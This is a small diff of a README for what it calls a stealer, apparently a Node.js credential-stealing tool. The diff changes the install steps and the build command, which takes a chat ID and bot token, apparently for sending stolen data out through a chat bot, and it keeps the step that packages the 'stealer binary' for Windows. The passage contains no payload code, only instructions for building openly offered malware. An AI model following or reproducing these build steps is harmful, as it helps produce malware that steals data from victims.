@@ -15,14 +15,14 @@ https://youtu.be/3mKOwtCnwYw
 Install dependencies
 
 ```sh
-npm i
+npm i -D
 npm i -g pkg
 ```
 
 Build
 
 ```sh
-npm run configure <chat_id> <bot_token> # Or just set it in `runner.js`
+npm run build <chat_id> <bot_token>
 
 # Create the stealer binary, choose target system and architecture
 npm run pkg-windows
